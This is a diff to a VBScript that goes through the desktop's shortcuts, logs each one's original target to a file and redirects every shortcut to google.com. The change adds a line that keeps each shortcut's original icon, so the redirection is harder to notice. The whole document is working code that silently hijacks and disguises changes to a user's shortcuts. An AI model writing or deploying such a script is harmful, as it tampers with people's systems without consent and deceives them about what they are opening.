@@ -14,10 +14,12 @@ Set outFile = objFSO.CreateTextFile(result, True)
 For Each File In desk.Files
     ' WHEN TESTING, ADD OTHER RESTRICTIONS HERE
     If File.Type = "Shortcut" Then
-        outFile.Write  File.Name &  ": " & sh.CreateShortcut(File).TargetPath & vbCrLf
+        originalTarget = sh.CreateShortcut(File).TargetPath
+        outFile.Write  File.Name &  ": " & originalTarget  & vbCrLf
         Set shortcut = sh.CreateShortcut(deskPath + "\" + File.Name)
         ' Redirect
         shortcut.TargetPath = "http://google.com"
+        shortcut.IconLocation = originalTarget
         shortcut.Save
     End If
 Next
